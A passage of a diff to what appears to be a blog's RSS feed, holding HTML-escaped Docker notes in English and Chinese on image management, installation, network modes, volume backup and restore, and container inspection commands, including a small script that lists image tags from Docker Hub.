+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker rmi &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> IMAGE &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>IMAGE...&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="history">history&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Show the history of an image&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --no-trunc Don&amp;#39;t truncate output&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">history&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> IMAGE
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="save">save&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Save one or more images to a tar archive&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker save -o &amp;lt;tar_file_name&amp;gt; &amp;lt;image&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="load">load&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Load an image from a tar archive or STDIN。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker load -i &amp;lt;tar_file_name&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dockertagssh">&lt;code>dockertags.sh&lt;/code>&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span> &lt;span style="color:#000">$#&lt;/span> -lt &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat &lt;span style="color:#4e9a06">&amp;lt;&amp;lt; HELP
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">dockertags -- list all tags for a Docker image on a remote registry.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">EXAMPLE:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> - list all tags for ubuntu:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> dockertags ubuntu
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> - list all php tags containing apache:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> dockertags php apache
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">HELP&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">image&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$1&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">tags&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">`&lt;/span>wget -q https://registry.hub.docker.com/v1/repositories/&lt;span style="color:#4e9a06">${&lt;/span>&lt;span style="color:#000">image&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span>/tags -O - &lt;span style="color:#000;font-weight:bold">|&lt;/span> sed -e &lt;span style="color:#4e9a06">&amp;#39;s/[][]//g&amp;#39;&lt;/span> -e &lt;span style="color:#4e9a06">&amp;#39;s/&amp;#34;//g&amp;#39;&lt;/span> -e &lt;span style="color:#4e9a06">&amp;#39;s/ //g&amp;#39;&lt;/span> &lt;span style="color:#000;font-weight:bold">|&lt;/span> tr &lt;span style="color:#4e9a06">&amp;#39;}&amp;#39;&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;\n&amp;#39;&lt;/span> &lt;span style="color:#000;font-weight:bold">|&lt;/span> awk -F: &lt;span style="color:#4e9a06">&amp;#39;{print $3}&amp;#39;&lt;/span>&lt;span style="color:#4e9a06">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span> -n &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$2&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">tags&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">`&lt;/span> &lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#4e9a06">${&lt;/span>&lt;span style="color:#000">tags&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#000;font-weight:bold">|&lt;/span> grep &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000">$2&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span> &lt;span style="color:#4e9a06">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#4e9a06">${&lt;/span>&lt;span style="color:#000">tags&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Docker Install</title><link>/note/container/docker/docker-install/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/container/docker/docker-install/</guid><description>
+&lt;h2 id="docker">docker&lt;/h2>
+&lt;h3 id="docker-ce">docker-ce&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># https://docs.docker.com/engine/install/debian/&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt-get install &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> apt-transport-https &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> ca-certificates &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> curl &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> gnupg &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> lsb-release -y
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -fsSL https://download.docker.com/linux/debian/gpg &lt;span style="color:#000;font-weight:bold">|&lt;/span> sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian \
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06"> &lt;/span>&lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>lsb_release -cs&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>&lt;span style="color:#4e9a06"> stable&amp;#34;&lt;/span> &lt;span style="color:#000;font-weight:bold">|&lt;/span> sudo tee /etc/apt/sources.list.d/docker.list &amp;gt; /dev/null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt-get update
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt-get install docker-ce docker-ce-cli containerd.io
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo systemctl status docker
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo usermod -aG docker &lt;span style="color:#000">$USER&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="debianubuntu">debian/ubuntu&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>sudo apt-get install docker.io
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># order to perform docker without sudo prefix &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo usermod -aG docker &lt;span style="color:#000">$USER&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo systemctl start docker
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo docker run --rm hello-world
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt-get autoremove --purge docker-io
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm -rf /var/lib/docker
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="centosfedora">centos/fedora&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>sudo dnf install docker
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 启动 Docker 服务&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># sudo service docker start&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo systemctl start docker
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run --rm hello-world
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker version
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker info
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 为避免输入sudo，可以把用户加入 Docker 用户组&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo groupadd docker
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo usermod -aG docker &lt;span style="color:#000">$USER&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Docker Network</title><link>/note/container/docker/docker-network/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/container/docker/docker-network/</guid><description>
+&lt;h2 id="--link">&lt;code>--link&lt;/code>&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># source container&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run --name mysql -e &lt;span style="color:#000">MYSQL_ROOT_PASSWORD&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>server -d mysql
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># received container&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 在nginx的容器中，使用db或者aliasmysql作为连接地址来连接MySQL服务&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run --name nginx --link mysql:aliasmysql -d nginx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>docker将source container中定义的环境变量全部导入到received container中，在received container中可以通过环境变量来获取连接信息&lt;/p>
+&lt;p>通过给/etc/hosts中加入名称和IP的解析关系来实现&lt;/p>
+&lt;h2 id="network">network&lt;/h2>
+&lt;p>docker容器的网络有五种模式：&lt;/p>
+&lt;p>1）&lt;strong>bridge模式&lt;/strong>，&amp;ndash;net=bridge(默认)
+这是dokcer网络的默认设置，为容器创建独立的网络命名空间，容器具有独立的网卡等所有单独的网络栈，是最常用的使用方式。
+在docker run启动容器的时候，如果不加&amp;ndash;net参数，就默认采用这种网络模式。安装完docker，系统会自动添加一个供docker使用的网桥docker0，我们创建一个新的容器时，
+容器通过DHCP获取一个与docker0同网段的IP地址，并默认连接到docker0网桥，以此实现容器与宿主机的网络互通。&lt;/p>
+&lt;p>2）&lt;strong>host模式&lt;/strong>，&amp;ndash;net=host
+这个模式下创建出来的容器，直接使用容器宿主机的网络命名空间。
+将不拥有自己独立的Network Namespace，即没有独立的网络环境。它使用宿主机的ip和端口。&lt;/p>
+&lt;p>3）&lt;strong>none模式&lt;/strong>，&amp;ndash;net=none
+为容器创建独立网络命名空间，但不为它做任何网络配置，容器中只有lo，用户可以在此基础上，对容器网络做任意定制。
+这个模式下，dokcer不为容器进行任何网络配置。需要我们自己为容器添加网卡，配置IP。
+因此，若想使用pipework配置docker容器的ip地址，必须要在none模式下才可以。&lt;/p>
+&lt;p>4）&lt;strong>container模式&lt;/strong>，&amp;ndash;net=container:NAME_or_ID
+与host模式类似，只是容器将与指定的容器共享网络命名空间。
+这个模式就是指定一个已有的容器，共享该容器的IP和端口。除了网络方面两个容器共享，其他的如文件系统，进程等还是隔离开的。容器可以相以localhost访问，构成一个统一的整体。&lt;/p>
+&lt;p>5）&lt;strong>用户自定义&lt;/strong>：docker 1.9版本以后新增的特性，允许容器使用第三方的网络实现或者创建单独的bridge网络，提供网络隔离能力&lt;/p>
+&lt;p>在用户定义网络模式下，开发者可以使用任何docker支持的第三方网络driver来定制容器的网络。并且，docker 1.9以上的版本默认自带了bridge和overlay两种类型的自定义网络driver。可以用于集成calico、weave、openvswitch等第三方厂商的网络实现。&lt;/p>
+&lt;p>除了docker自带的bridge driver，其他的几种driver都可以实现容器的跨主机通信。而基于bdrige driver的网络，docker会自动为其创建iptables规则，保证与其他网络之间、与docker0之间的网络隔离。&lt;/p>
+&lt;h3 id="warning-ipv4-forwarding-is-disabled-networking-will-not-work">WARNING: IPv4 forwarding is disabled. Networking will not work.&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;net.ipv4.ip_forward=1&amp;#34;&lt;/span> &amp;gt;&amp;gt;/usr/lib/sysctl.d/00-system.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl restart network &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> systemctl restart docker
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="volume">volume&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;h3 id="backup">backup&lt;/h3>
+&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker volume create data
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run -v data:/path/to/data --name data_container &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> -d -it --rm &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> busybox /bin/sh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run --rm --volumes-from data_container -v &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>&lt;span style="color:#204a87">pwd&lt;/span>&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>:/backup busybox tar cvf /backup/data_backup.tar path/to/data
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>
+&lt;h3 id="restore">restore&lt;/h3>
+&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker run -v data:/path/to/data --name data_container2 &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> -d -it --rm &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> busybox /bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run --rm --volumes-from data_container2 &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> -v &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>&lt;span style="color:#204a87">pwd&lt;/span>&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>:/backup busybox &lt;span style="color:#4e9a06">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#4e9a06">&lt;/span> bash -c &lt;span style="color:#4e9a06">&amp;#34;cd /path/to/data &amp;amp;&amp;amp; tar xvf /backup/data_backup.tar --strip 1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Docker Ps</title><link>/note/container/docker/docker-ps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/container/docker/docker-ps/</guid><description>
+&lt;h2 id="ps">ps&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker ps -a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Show the latest created container, Only display numeric IDs&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker ps -lq
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker ps --format &lt;span style="color:#4e9a06">&amp;#39;table {{.Names}}\t{{.Image}}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>vim ~/.docker/config.json.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;psFormat&amp;#34;&lt;/span>: &lt;span style="color:#4e9a06">&amp;#34;table {{.Names}}\\t{{.Image}}\\t{{.RunningFor}} ago\\t{{.Status}}\\t{{.Command}}&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;imagesFormat&amp;#34;&lt;/span>: &lt;span style="color:#4e9a06">&amp;#34;table {{.Repository}}\\t{{.Tag}}\\t{{.ID}}\\t{{.Size}}&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>OPTIONS说明：&lt;/p>
+&lt;ul>
+&lt;li>**-a :**显示所有的容器，包括未运行的。&lt;/li>
+&lt;li>**-f :**根据条件过滤显示的内容。&lt;/li>
+&lt;li>**&amp;ndash;format :**指定返回值的模板文件。&lt;/li>
+&lt;li>**-l :**显示最近创建的容器。&lt;/li>
+&lt;li>**-n :**列出最近创建的n个容器。&lt;/li>
+&lt;li>**&amp;ndash;no-trunc :**不截断输出。&lt;/li>
+&lt;li>**-q :**静默模式，只显示容器编号。&lt;/li>
+&lt;li>**-s :**显示总的文件大小。&lt;/li>
+&lt;/ul>
+&lt;h2 id="inspect">inspect&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 显示容器的第一个进程的PID&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker inspect -f &lt;span style="color:#ce5c00;font-weight:bold">{{&lt;/span>.State.Pid&lt;span style="color:#ce5c00;font-weight:bold">}}&lt;/span> &amp;lt;container_id&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker inspect --format&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;{{.RootFS.Layers}}&amp;#39;&lt;/span> &amp;lt;image_id&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker inspect --format&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;{{.NetworkSettings.IPAddress }}&amp;#39;&lt;/span> &amp;lt;container_id&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>获取容器/镜像的元数据&lt;/p>
+&lt;p>OPTIONS说明：&lt;/p>
+&lt;ul>
+&lt;li>**-f :**指定返回值的模板文件。&lt;/li>
+&lt;li>**-s :**显示总的文件大小。&lt;/li>
+&lt;li>**&amp;ndash;type :**为指定类型返回JSON。&lt;/li>
+&lt;/ul>
+&lt;h2 id="diff">diff&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker diff &amp;lt;container_id&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="top">top&lt;/h2>
+&lt;p>查看容器中运行的进程信息&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker top &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> CONTAINER &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>ps OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 查看所有运行容器的进程信息&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">for&lt;/span> i in &lt;span style="color:#4e9a06">`&lt;/span>docker ps &lt;span style="color:#000;font-weight:bold">|&lt;/span>grep Up&lt;span style="color:#000;font-weight:bold">|&lt;/span>awk &lt;span style="color:#4e9a06">&amp;#39;{print $1}&amp;#39;&lt;/span>&lt;span style="color:#4e9a06">`&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">do&lt;/span> &lt;span style="color:#204a87">echo&lt;/span> &lt;span style="color:#4e9a06">\ &lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span>docker top &lt;span style="color:#000">$i&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#204a87;font-weight:bold">done&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="logs">logs&lt;/h2>
+&lt;p>获取容器的日志&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker logs &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> CONTAINER
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tail -f /var/lib/docker/containers/&amp;lt;cid&amp;gt;/&amp;lt;cid&amp;gt;-json.log
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
